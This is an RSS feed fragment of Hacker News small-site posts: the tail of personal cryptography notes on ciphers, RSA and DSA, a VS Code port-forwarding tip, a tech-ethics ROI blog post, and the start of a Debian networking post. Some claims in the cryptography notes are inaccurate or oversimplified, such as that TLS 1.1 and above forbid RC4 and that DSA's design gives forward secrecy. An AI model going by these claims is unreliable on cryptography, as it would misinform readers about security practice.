<li>AES-<a href="https://en.wikipedia.org/wiki/Block_cipher_modes_of_operation#Cipher-block_chaining_.28CBC.29" target="_blank">CBC</a> is what older clients commonly use. AES-CBC mode is susceptible to attacks such as <a href="http://blog.cloudflare.com/new-ssl-vulnerabilities-cloudflare-users-prot" target="_blank">Lucky13</a> and <a href="http://blog.cloudflare.com/taming-beast-better-ssl-now-available-across" target="_blank">BEAST</a>.</li>
<li>See <a href="http://stackoverflow.com/a/22958889/2610230" target="_blank">this answer</a> for an excellent overview of the various modes.&nbsp;</li>
</ul>
</li>
</ul>
</li>
<li>Blowfish ‚Äì designed by&nbsp;Bruce Schneier&nbsp;as an alternative to DES; no issues so far, but can be attacked if the key is weak, better to use Twofish or Threefish.
<ul>
<li>Patent free. In public domain.&nbsp;</li>
<li>Supported by SSH.</li>
<li><a href="http://www.docstore.mik.ua/orelly/networking_2ndEd/ssh/ch03_09.htm" target="_blank">Much faster</a> than DES and IDEA but not as fast as RC4.</li>
<li>Uses variable size keys of 32 to 448 bits. Considered secure. Designed for fast&nbsp;CPUs, now&nbsp;slower / old er CPUs.</li>
<li>Blowfish&nbsp;is a&nbsp;<a href="https://en.wikipedia.org/wiki/Block_cipher" target="_blank">block cipher</a>.</li>
</ul>
</li>
<li>Twofish ‚Äì&nbsp;designed by&nbsp;Bruce Schneier and others as a successor to Blowfish
<ul>
<li>Was one of the finalists in the AES competition</li>
<li>Most CPUs now include hardware AES support making it very fast than Twofish.</li>
<li>Patent free. In public domain.</li>
<li>Uses&nbsp;keys of size 128, 192, or 256 bits. Designed to be more flexible than Blowfish (in terms of hardware requirements).&nbsp;</li>
<li>Supported&nbsp;by TrueCrypt, SSH.&nbsp;</li>
<li>Twofish&nbsp;is a&nbsp;<a href="https://en.wikipedia.org/wiki/Block_cipher" target="_blank">block cipher</a>.</li>
</ul>
</li>
<li>Threefish ‚Äì designed&nbsp;by&nbsp;Bruce Schneier and others
<ul>
<li>Threefish&nbsp;is a&nbsp;<a href="https://en.wikipedia.org/wiki/Block_cipher" target="_blank">block cipher</a>.</li>
</ul>
</li>
<li>Serpent ‚Äì designed by&nbsp;Ross Anderson, Eli Biham, and Lars Knudsen
<ul>
<li>Was one of the&nbsp;finalists in the AES competition</li>
<li>Patent free. In public domain.</li>
<li>Has a more conservative approach to security than other AES competition finalists.&nbsp;</li>
<li>Supported&nbsp;by TrueCrypt.&nbsp;</li>
<li>Serpent&nbsp;is a&nbsp;<a href="https://en.wikipedia.org/wiki/Block_cipher" target="_blank">block cipher</a>.</li>
</ul>
</li>
<li>MARS ‚Äì designed by Don Coppersmith (who was involved in DES) and others at IBM
<ul>
<li>Was one of the&nbsp;finalists in the AES competition</li>
</ul>
</li>
<li>RC6 ‚Äì Rivest Cipher 6 or Ron‚Äôs Code 6 ‚Äì designed by Ron Rivest and others
<ul>
<li>Was one of the&nbsp;finalists in the AES competition</li>
<li>Proprietary algorithm. Patented by RSA Security.&nbsp;</li>
<li>RC5 is a predecessor of RC6. Other siblings include RC2 and RC4.&nbsp;</li>
<li>More on RC5 and RC6 at <a href="http://www.emc.com/emc-plus/rsa-labs/standards-initiatives/rc5-and-rc6.htm" target="_blank">this RSA link</a>.&nbsp;</li>
<li>RC5 and RC6 are&nbsp;<a href="https://en.wikipedia.org/wiki/Block_cipher" target="_blank">block ciphers</a>.</li>
</ul>
</li>
<li>RC4 ‚Äì Rivest Cipher 4, or Ron‚Äôs Code 4 ‚Äì also known as ARC4 or ARCFOUR (Alleged RC4).
<ul>
<li><a href="http://www.docstore.mik.ua/orelly/networking_2ndEd/ssh/ch03_09.htm" target="_blank">Used to be</a> an unpatented trade-secret for&nbsp;RSA Data Security Inc (RSADSI). Then someone posted the source code online, anonymously, and it got into the public domain.&nbsp;</li>
<li>Very fast, but less studied than other algorithms.&nbsp;
<ul>
<li>RC4 is good if the key is never reused. Then its considered secure by many.&nbsp;</li>
<li>In practice RC4 is not recommended. TLS 1.1 and above&nbsp;<a href="https://en.wikipedia.org/wiki/Transport_Layer_Security#Cipher" target="_blank">forbid RC4</a>&nbsp;(also <a href="https://tools.ietf.org/html/draft-ietf-tls-prohibiting-rc4-01" target="_blank">this RFC</a>). <a href="http://blog.cloudflare.com/killing-rc4-the-long-goodbye/" target="_blank">CloudFlare recommends against it</a>&nbsp;(check <a href="http://blog.cloudflare.com/staying-on-top-of-tls-attacks/" target="_blank">this blog post</a> too). <a href="http://blogs.technet.com/b/srd/archive/2013/11/12/security-advisory-2868725-recommendation-to-disable-rc4.aspx" target="_blank">Microsoft recommends against it</a>. Current recommendations overall are to use TLS 1.2 (which forbids RC4) and use <a href="http://www.heliontech.com/aes_gcm.htm" target="_blank">AES-GCM</a>.</li>
<li>See this <a href="http://blog.cryptographyengineering.com/2013/03/attack-of-week-rc4-is-kind-of-broken-in.html" target="_blank">blog post</a> too.</li>
</ul>
</li>
<li>RC4 is a <a href="https://en.wikipedia.org/wiki/Stream_cipher" target="_blank">stream cipher</a>. It‚Äôs the most widely used stream cipher.&nbsp;
<ul>
<li>Recently <a href="http://blog.cryptographyengineering.com/2013/02/attack-of-week-tls-timing-oracles.html" target="_blank">block ciphers were found to have issues</a>&nbsp;(e.g. <a href="http://www.net-security.org/article.php?id=1638" target="_blank">BEAST</a>, <a href="http://blog.cryptographyengineering.com/2013/02/attack-of-week-tls-timing-oracles.html" target="_blank">Lucky13</a>)&nbsp;because of which RC4 rose in importance. Now such attacks are mitigated (use GCM mode for instance) and RC4 is strongly recommended against.&nbsp;</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2>Asymmetric key algorithms (Public key cryptography)</h2>
<p>Each party has&nbsp;a private key (kept secret) and a public key (known to all). These are used in the following way:</p>
<ul>
<li><strong>Public keys are used for encrypting, Private keys are used for decrypting.&nbsp;</strong>
<ul>
<li>For example: to send something encrypted to a party use its public key and send the encrypted data. Since only that party has the corresponding private key, only that party can decrypt it. (No point encrypting it with your private key as anyone can then decrypt with your public key!)</li>
</ul>
</li>
<li><strong>Private keys are used for signing, Public keys are used for verifying.&nbsp;</strong>
<ul>
<li>For example: to digitally sign something, encrypt it with your private key (usually a hash is made and the hash encrypted). Anyone can decrypt this data (or decrypt the hash &amp; data and perform a hash themselves to verify&nbsp;your hash and their hash match) and verify that since it was signed by your private key the data belongs to you.&nbsp;</li>
</ul>
</li>
</ul>
<p>These algorithms are usually used to digitally sign data and/ or exchange a secret key which can be used with a symmetric key algorithm to encrypt further data. They are often not used for encrypting the conversation either because they can‚Äôt (DSA, Diffie-Hellman) or because the yield is low and there are speed constraints (RSA). Most of these algorithms make use of&nbsp;hashing functions (see below) for <a href="http://security.stackexchange.com/a/9265" target="_blank">internal purposes</a>.&nbsp;</p>
<ul>
<li>RSA ‚Äì short for the surnames of its designers&nbsp;Ron Rivest, Adi Shamir and Leonard Adleman
<ul>
<li>Not used to encrypt data directly because of <a href="http://www.paradigm.ac.uk/workbook/metadata/authenticity-signatures.html" target="_blank">speed&nbsp;constraints</a> and also because its yield is small (see <a href="http://security.stackexchange.com/a/9265" target="_blank">this post</a> for a good explanation; also <a href="http://technet.microsoft.com/en-us/library/cc962021.aspx" target="_blank">this TechNet</a> article).
<ul>
<li>Usually RSA is used to&nbsp;share a secret key and then a symmetric key algorithm is used for the actual encryption.&nbsp;</li>
<li>RSA can be used for digital signing but is slower. DSA (see below) is preferred. However, RSA signatures are <a href="http://security.stackexchange.com/a/5105" target="_blank">faster to verify</a>.&nbsp;To sign data <a href="http://www.paradigm.ac.uk/workbook/metadata/authenticity-signatures.html" target="_blank">a hash is made of it and the hash encrypted</a> with the private key. (Note: RSA <em>requires</em> that <a href="http://crypto.stackexchange.com/questions/12768/why-hash-the-message-before-signing-it-digital-signature-with-rsa" target="_blank">a hash be made</a> rather than encrypt the data itself). &nbsp;</li>
<li>RSA does not&nbsp;require the use of any particular hash function.&nbsp;</li>
</ul>
</li>
<li>Public and Private keys are based on two large prime numbers which must be kept secret. RSA‚Äôs security is based on the fact that <a href="http://en.wikipedia.org/wiki/Integer_factorization" target="_blank">factorization of large integers</a> is difficult. (The public and private keys are large integers which are&nbsp;derived from&nbsp;the two large prime numbers).</li>
<li>PKCS#1 is a standard for implementing&nbsp;the RSA algorithm. The RSA algorithm can be attacked if certain criteria are met so the PKCS#1 defines things such that these criteria are not met. See <a href="http://rdist.root.org/2009/10/06/why-rsa-encryption-padding-is-critical/" target="_blank">this post</a> for more info.&nbsp;</li>
<li>Was originally patented by the RSA but has since (circa 2000) expired.&nbsp;</li>
<li><a href="http://linux.die.net/man/1/ssh-keygen" target="_blank">SSH v1</a> only uses RSA keys (for identity verification).&nbsp;</li>
</ul>
</li>
<li>DSA ‚Äì Digital Signature Algorithm ‚Äì designed by the NSA as part of the Digital Signature Standard (DSS)
<ul>
<li>Used for digital signing. Does not do encryption. (But implementations can do encryption using RSA or ElGamal encryption)&nbsp;</li>
<li>DSA is <a href="http://security.stackexchange.com/a/5105" target="_blank">fast at signing but slow at verifying</a>.&nbsp;
<ul>
<li>It <a href="http://www.paradigm.ac.uk/workbook/metadata/authenticity-signatures.html" target="_blank">mandates the use of SHA hashes</a> when computing digital signatures.&nbsp;</li>
<li>Unlike RSA which makes a hash of the data and then encrypts it to sign the message ‚Äì and this data plus encrypted hash is what‚Äôs used to verify the signature ‚Äì DSA has a different process. DSA&nbsp;<a href="http://technet.microsoft.com/en-us/library/cc962021.aspx" target="_blank">generates a digital signature composed of two 160-bit numbers</a> directly from the private key and a hash of the data to be signed. The corresponding public key can be used to verify the signature. The verifying is slow.&nbsp;</li>
<li>A note about speed:&nbsp;DSA is faster at signing, slow at verifying. RSA is&nbsp;faster at verifying, slow at signing.&nbsp;The&nbsp;significance of this is different from what you may think. Signing can be used to sign data, it can also be used for authentication. For instance, when using SSH you sign some data with your private&nbsp;key and send to the server. The server verifies the signature and if it&nbsp;succeeds you are authenticated. In such a situation it doesn‚Äôt matter that DSA verification is slow because it usually happens on a powerful server. DSA signing, which happens on a relatively slower computer/ phone/ tablet is a much faster process and so less intensive on the processor. In such a&nbsp;scenario DSA is preferred! Remember: <em>where</em> the slow/ fast activity occurs also matters.&nbsp;</li>
</ul>
</li>
<li>DSA can be used <a href="http://security.stackexchange.com/a/5105" target="_blank">only for signing</a>. So DSA&nbsp;has to use something like Diffie-Hellman to generate another key for encrypting&nbsp;the conversation.&nbsp;
<ul>
<li>This is a good thing as it allows for Perfect Forward Secrecy (PFS).&nbsp;
<ul>
<li>Forward Secrecy =&gt; the shared key used for encrypting conversation between two parties is not related to their public/ private key.</li>
<li>Perfect Forward Secrecy =&gt; in addition to the above, the shared keys are generated for each conversation and are independent of each other.&nbsp;</li>
</ul>
</li>
<li>Also, because&nbsp;DSA can be&nbsp;used only for digital signatures and not encryption, it&nbsp;is usually <a href="http://technet.microsoft.com/en-us/library/cc962021.aspx" target="_blank">not subject to export or import restrictions</a>. Therefore it can be used more widely.</li>
</ul>
</li>
<li>Patented but made available&nbsp;royalty free.&nbsp;</li>
<li>DSA‚Äôs security is based on&nbsp;the <a href="http://en.wikipedia.org/wiki/Discrete_logarithm" target="_blank">discrete logarithm</a> problem.&nbsp;</li>
<li>Section 3.9.1.2 of <a href="http://www.docstore.mik.ua/orelly/networking_2ndEd/ssh/ch03_09.htm" target="_blank">this article</a> is worth a read. Since it‚Äôs designed by the NSA, DSA has&nbsp;some controversies.&nbsp;</li>
<li><a href="http://linux.die.net/man/1/ssh-keygen" target="_blank">SSH v2</a> can use RSA or DSA&nbsp;keys (for identity verification). It prefers DSA because RSA used to be patent protected. But now that the patents have <a href="http://www.docstore.mik.ua/orelly/networking_2ndEd/ssh/ch03_09.htm" target="_blank">expired RSA is supported</a>.&nbsp;</li>
<li>RSA is supported by all versions of SSL/ TLS.&nbsp;</li>
<li>DSA (and ECDSA) requires random numbers. If the random number generator ‚Ä¶</li></ul></li></ul></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://rakhesh.com/infrastructure/notes-on-cryptography-ciphers-rsa-dsa-aes-rc4-ecc-ecdsa-sha-and-so-on/">https://rakhesh.com/infrastructure/notes-on-cryptography-ciphers-rsa-dsa-aes-rc4-ecc-ecdsa-sha-and-so-on/</a></em></p>]]>
            </description>
            <link>https://rakhesh.com/infrastructure/notes-on-cryptography-ciphers-rsa-dsa-aes-rc4-ecc-ecdsa-sha-and-so-on/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25800039</guid>
            <pubDate>Sat, 16 Jan 2021 04:28:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[VS Code Automagic Port Forwarding]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25799210">thread link</a>) | @maxrev17
<br/>
January 15, 2021 | https://www.maxrevitt.com/vs-code-automagical-port-forwarding/ | <a href="https://web.archive.org/web/*/https://www.maxrevitt.com/vs-code-automagical-port-forwarding/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">
<section id="site-content-posts">
<article id="post-8">
<p>Date: 16 January 2021</p><div><p>Categories: <a href="https://www.maxrevitt.com/category/coding/" title="coding">coding</a>, <a href="https://www.maxrevitt.com/category/tools/" title="tools">tools</a></p></div>
<p>I was trying to get a development VM working (Windows host, Linux guest). I‚Äôd just binned WSL2 as it was causing me a bit of jip, and had been happily coding all day with Remote SSH into my shiny new Ubuntu VM via VS Code. I was, however, having a few problems. The frontend I was working on was using Auth0 for authentication, and that wasn‚Äôt happy on a non-localhost domain, with no HTTPS. Webpack to the rescue‚Ä¶ give me a dev cert‚Ä¶ done and working. Until the frontend tries to make a request to the backend ‚Äì blocked due to mixed HTTP/HTTPS.</p>
<p>I was going round the houses finding the best solution for getting a system in place to allow both DNS (host file?‚Ä¶ lightweight DNS proxy?!), and SSL termination on the VM (nginx, caddy, traefik?!).</p>
<p>After spending a very long time investigating the latest and greatest, I randomly refreshed an old localhost:8081 tab running in Chrome (the site I was working on was running here) and to my surprise, the whole thing loaded, from the Ubuntu VM. To check I wasn‚Äôt crackers I checked the logs there, and it was the VM serving my requests. How?! Whaaaaaattt????!!!!!</p>
<p>I could understand this if I‚Äôd had a few gins, but no, maybe tired eyes? After some digging, I discovered that if a program outputs a localhost:port style URL into the terminal in VS Code whilst you are using the Remote SSH feature, and you click it, it will automagically setup a port forward.</p>
<figure><img loading="lazy" width="1024" height="140" src="http://maxrevitt.docker.localhost/wp-content/uploads/2021/01/image-1024x140.png" alt="" srcset="https://www.maxrevitt.com/wp-content/uploads/2021/01/image-1024x140.png 1024w, https://www.maxrevitt.com/wp-content/uploads/2021/01/image-300x41.png 300w, https://www.maxrevitt.com/wp-content/uploads/2021/01/image-768x105.png 768w, https://www.maxrevitt.com/wp-content/uploads/2021/01/image-580x79.png 580w, https://www.maxrevitt.com/wp-content/uploads/2021/01/image.png 1352w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Port forward automatically set up on clicking the echo‚Äôd link ‚Äì try it out</figcaption></figure>
<p>What a handy little feature! One worth knowing about for those juxtaposed between Windows and Linux, or just taking advantage of the remote features of VS code. Don‚Äôt do what I did and go round the houses, this is a great solution to many problems.</p>
<hr> 
</article>
</section>

</div></div>]]>
            </description>
            <link>https://www.maxrevitt.com/vs-code-automagical-port-forwarding/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25799210</guid>
            <pubDate>Sat, 16 Jan 2021 02:03:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ethics can increase revenue in tech businesses]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25799179">thread link</a>) | @elorant
<br/>
January 15, 2021 | https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses | <a href="https://web.archive.org/web/*/https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="8.13.3"><div dir="ltr"><div><div id="viewer-dcqil"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses" data-pin-media="https://static.wixstatic.com/media/575efd_64495fef8c9a4d93b56b2b9c9e34ccad~mv2.jpg/v1/fit/w_1000%2Ch_602%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/575efd_64495fef8c9a4d93b56b2b9c9e34ccad~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-dpop0"><span><span>As a society we revel in stories of successful individuals that risked it all and won big. It‚Äôs so often the rags to riches, starving artist or the struggling entrepreneur that catches the headlines. Outside the world of start-up mythology however it‚Äôs more commonly risk aversion that keeps the world of business ticking over. 

<!-- -->Professor Ralph O‚ÄôSwarm studied risk attitudes in 100 executives and found that they ‚Äúdo not portray the risk-takers we hear so much of in industrial folklore.‚Äù, ‚ÄúThey quash new ideas in favor of marginal improvements, cost-cutting, and ‚Äúsafe‚Äù investments.‚Äù </span><a href="https://hbr.org/2020/03/your-company-is-too-risk-averse" target="_blank" rel="noopener"><u><span>hbr.org</span></u></a></span></p><blockquote id="viewer-9tlfe"><span><em><span>In current practice, however, executives in large corporations are reluctant to propose and advocate for risky projects. They quash new ideas in favor of marginal improvements, cost-cutting, and ‚Äúsafe‚Äù investments.</span></em></span></blockquote><p id="viewer-bnfgd"><span><span>So why aren‚Äôt more businesses making every effort to embed ethics into their organisations and products? At a very rudimentary level embedding ethics into your work will keep you a step ahead of compliance regulation and reduces the risk of negative PR from unethical business practices. Is it because it‚Äôs difficult to perceive the potential monetary value of ethics? Or the value lost by not incorporating ethics? 

At Hattusia although we believe that the value of ethics extends far beyond the bottom line on a balance sheet; it does have financial value. We created the Hattusia ROI calculator to look at exactly this. What is the risk of not embedding ethics into your work and what is the potential financial reward? </span></span></p><p id="viewer-5q5uq"><span><span>The following are three examples of (fictional) businesses within three different industries that we‚Äôve put through the Hattusia ROI Calculator. The calculator factors:

‚úîÔ∏è possible market share increases due to ethical innovations</span></span></p><p id="viewer-9kk91"><span><span>‚úîÔ∏è potential market size growth due to your ethical building principles becoming a standard within your industry</span></span></p><p id="viewer-duobf"><span><span>
‚ùå reputation risk in losing market share because of the negative responses to your product</span></span></p><p id="viewer-80j51"><span><span>‚ùå regulatory risk of your products or industry receiving bans due to new regulation</span></span></p><p id="viewer-28pg8"><span><span>‚ùå risk of non-compliance as you may have to make significant changes to your product to comply with new regulation </span></span></p><h2 id="viewer-817r2"><span><strong><span>Seasonal Stay Fever (SSF)</span></strong></span></h2><div id="viewer-d6e3u"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img" aria-label="Seasonal Stay Fever"><p><img data-pin-url="https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses" data-pin-media="https://static.wixstatic.com/media/575efd_59b89f2aef1e40c2856d8d1007dc126a~mv2.jpg/v1/fit/w_1000%2Ch_784%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/575efd_59b89f2aef1e40c2856d8d1007dc126a~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg" alt="Seasonal Stay Fever"></p></div><p><span dir="auto">Photo by Robert Bye on Unsplash</span></p></div></div></div><blockquote id="viewer-5vncb"><span><span>SSF will be a platform that uses information like your holiday budget, past holidays, and family size to match you with the perfect Staycation. </span></span></blockquote><p id="viewer-e5djk"><span><span>The biggest potential ethical risk with SSF will come through their use of data. Not only are they obtaining and storing personal information but they are also using this data to make assumptions about their customers. How those assumptions are made and who has access to the data are going to have to be carefully thought through. 

<strong>Market Size:</strong> ¬£93000000000</span></span></p><p id="viewer-casq5"><span><span><strong>Annual Revenue:</strong> ¬£1200000</span></span></p><p id="viewer-66vb4"><span><span><strong>Market Share: </strong> 0.00129</span></span></p><p id="viewer-dbtig"><span><span><strong>Build Cost: </strong>150000</span></span></p><p id="viewer-bvfl3"><span><span><strong>Ethical Concern: </strong>High</span></span></p><div id="viewer-e8ap6"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img" aria-label="Hattusia Tech Ethics ROI Calculator - SSF"><p><img data-pin-url="https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses" data-pin-media="https://static.wixstatic.com/media/575efd_f132446014b748e4971d949c9c4abc7d~mv2.png/v1/fit/w_1000%2Ch_758%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/575efd_f132446014b748e4971d949c9c4abc7d~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png" alt="Hattusia Tech Ethics ROI Calculator - SSF"></p></div></div></div></div><div id="viewer-bj583"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img" aria-label="Tech Ethics Value Chart - Seasonal Stay Fever"><p><img data-pin-url="https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses" data-pin-media="https://static.wixstatic.com/media/575efd_ef4fd2bb66074887a3f2e43ff4200230~mv2.png/v1/fit/w_1000%2Ch_768%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/575efd_ef4fd2bb66074887a3f2e43ff4200230~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png" alt="Tech Ethics Value Chart - Seasonal Stay Fever"></p></div></div></div></div><p id="viewer-5smqt"><span>_________________________________________________________________________</span></p><p id="viewer-7fgnb"><span><span><strong>Want to learn more about ethics in tech? Sign up to our newsletter today.</strong></span></span></p><p id="viewer-9gq1d"><span>_________________________________________________________________________</span></p><h2 id="viewer-e47g6"><span><strong><span>Ingest Dooraly</span></strong></span></h2><div id="viewer-4taqf"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img" aria-label="Ingest Dooraly"><p><img data-pin-url="https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses" data-pin-media="https://static.wixstatic.com/media/575efd_5c4009b7dcdd48839c0ee195a6d8d7b8~mv2.jpg/v1/fit/w_1000%2Ch_574%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/575efd_5c4009b7dcdd48839c0ee195a6d8d7b8~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg" alt="Ingest Dooraly"></p></div><p><span dir="auto">Photo by RHSC on Unsplash</span></p></div></div></div><blockquote id="viewer-7phta"><span><span>Ingest Dooraly will be a subscription based website specialising in the next day delivery of non-prescription medication. </span></span></blockquote><p id="viewer-d6k9p"><span><span>As with SSF the business‚Äôs access to and use of data will be of high ethical concern. On top of that SSF will have to deal with whether their subscription lengths create a dependency on medication and how they market their products without influencing their customer‚Äôs ideas of how healthy or unhealthy they are. We therefore chose to label Ingest Dooraly with a Very High Ethical Concern.</span></span></p><p id="viewer-fe6me"><span><span><strong>Market Size:</strong> ¬£890000000</span></span></p><p id="viewer-e9stt"><span><span><strong>Annual Revenue:</strong> ¬£6000000</span></span></p><p id="viewer-51ll0"><span><span><strong>Market Share: </strong>0.67</span></span></p><p id="viewer-bno7"><span><span><strong>Build Cost: </strong>¬£600000</span></span></p><p id="viewer-fdae3"><span><span><strong>Ethical Concern: </strong>Very High</span></span></p><div id="viewer-2rkku"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img" aria-label="Hattusia Tech Ethics ROI Calculator - Ingest Dooraly"><p><img data-pin-url="https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses" data-pin-media="https://static.wixstatic.com/media/575efd_11b4b2a7e45d455499cb8341f2badf0e~mv2.png/v1/fit/w_1000%2Ch_762%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/575efd_11b4b2a7e45d455499cb8341f2badf0e~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png" alt="Hattusia Tech Ethics ROI Calculator - Ingest Dooraly"></p></div></div></div></div><div id="viewer-bc0ec"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img" aria-label="Tech Ethics Value Chart - Ingest Dooraly"><p><img data-pin-url="https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses" data-pin-media="https://static.wixstatic.com/media/575efd_6f958b2872614728aa260a892afcb63e~mv2.png/v1/fit/w_1000%2Ch_768%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/575efd_6f958b2872614728aa260a892afcb63e~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png" alt="Tech Ethics Value Chart - Ingest Dooraly"></p></div></div></div></div><h2 id="viewer-79t46"><span><strong><span>Ethics and chill</span></strong></span></h2><div id="viewer-fna8s"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img" aria-label="Ethics and Chill"><p><img data-pin-url="https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses" data-pin-media="https://static.wixstatic.com/media/575efd_4df14e54ba0e4fb19bdd2e0ce0acd457~mv2.jpg/v1/fit/w_1000%2Ch_556%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/575efd_4df14e54ba0e4fb19bdd2e0ce0acd457~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg" alt="Ethics and Chill"></p></div><p><span dir="auto">Photo by Jens Kreuter on Unsplash</span></p></div></div></div><blockquote id="viewer-bbrpl"><span><span>A digital streaming service focused towards ethics documentaries.</span></span></blockquote><p id="viewer-93bgh"><span><span>Video Streaming services and media outlets have a pervasive ability to influence our ideas around society and culture. Just recently Faizon Love sued Universal after they removed the only two people of colour from a </span><a href="https://www.thewrap.com/couples-retreat-faizon-love-poster-lawsuit/" target="_blank" rel="noopener"><span><u>movie poster</u></span></a><span> in favour of an all white cast. This ability to create and manipulate the media we consume and therefore ideas around society cannot be dismissed and although ‚ÄòEthics and Chill‚Äô has a unique content focus they would still hold a large amount of persuasive power over their users and the media they publish. </span></span></p><p id="viewer-a90so"><span><span><strong>Market Size:</strong> 1500000000</span></span></p><p id="viewer-3m9j6"><span><span><strong>Annual Revenue:</strong> 54000000</span></span></p><p id="viewer-6e7le"><span><span><strong>Market Share: </strong>3.6%</span></span></p><p id="viewer-85qdn"><span><span><strong>Build Cost:</strong> ¬£1500000</span></span></p><p id="viewer-blrfc"><span><span><strong>Ethical Concern:</strong> High</span></span></p><div id="viewer-easf"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses" data-pin-media="https://static.wixstatic.com/media/575efd_bc801239143042daacb178f236b453bd~mv2.png/v1/fit/w_1000%2Ch_773%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/575efd_bc801239143042daacb178f236b453bd~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><div id="viewer-c2riv"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses" data-pin-media="https://static.wixstatic.com/media/575efd_66671e3178d949cd87c8b1c4ce237ab3~mv2.png/v1/fit/w_1000%2Ch_768%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/575efd_66671e3178d949cd87c8b1c4ce237ab3~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><p id="viewer-dajra"><span><span>The Economist‚Äôs Intelligence Unit found that ‚ÄúResponsible AI can improve a firm‚Äôs top- and bottom-line growth by increasing customer engagement, broadening revenue streams, offering procurement advantages in competitive bidding processes, and increasing pricing power in the marketplace.‚Äù </span><a href="https://www.eiu.com/n/staying-ahead-of-the-curve-the-business-case-for-responsible-ai/?linkId=100000017507301" target="_blank" rel="noopener"><u><span>eiu.com</span></u></a><span> </span><span>
</span>
<span>We‚Äôve seen the potential financial impact that can be caused by not embedding ethical practice into your products as Amazon and IBM have had to remove facial recognition products from the market due to a growing mistrust over the quality of the technology and its applications. As well as the costs of product withdrawals this lack of trust can also be a major barrier to future revenue. Just recently Deliveroo lost a court case over their use of what was deemed a discriminatory algorithm. </span><a href="https://www.vice.com/en/article/7k9e4e/court-rules-deliveroo-used-discriminatory-algorithm" target="_blank" rel="noopener"><u><span>vice.com</span></u></a><span> </span></span></p><blockquote id="viewer-deo8q"><span><span><em>‚ÄúIf you can demonstrate that you are a trustworthy designer of technology, that will lead to economic value because more people will want to do business with you‚Äù. </em></span></span></blockquote><p id="viewer-1hr18"><span><span>- Will Griffin, Chief Ethics Officer at Hypergiant </span>

<span>The examples above have shown the potential financial reward of embedding tech ethics into your organisation. The Hattusia Ethics ROI calculator is designed to play a part in building your case for tech ethics but it is important to paint a holistic picture about why ethics is vital for modern business. </span></span></p></div></div></div></div></article></div></div>]]>
            </description>
            <link>https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses</link>
            <guid isPermaLink="false">hacker-news-small-sites-25799179</guid>
            <pubDate>Sat, 16 Jan 2021 01:58:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Renaming network interfaces on Debian GNU/Linux]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25798431">thread link</a>) | @forty
<br/>
January 15, 2021 | https://staging.forty.sh/posts/2021-01-15-renaming-network-interfaces/ | <a href="https://web.archive.org/web/*/https://staging.forty.sh/posts/2021-01-15-renaming-network-interfaces/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I use Debian Bullseye on a Lenovo T14 AMD. This laptop is great and works very well with a recent Linux kernel (5.10).
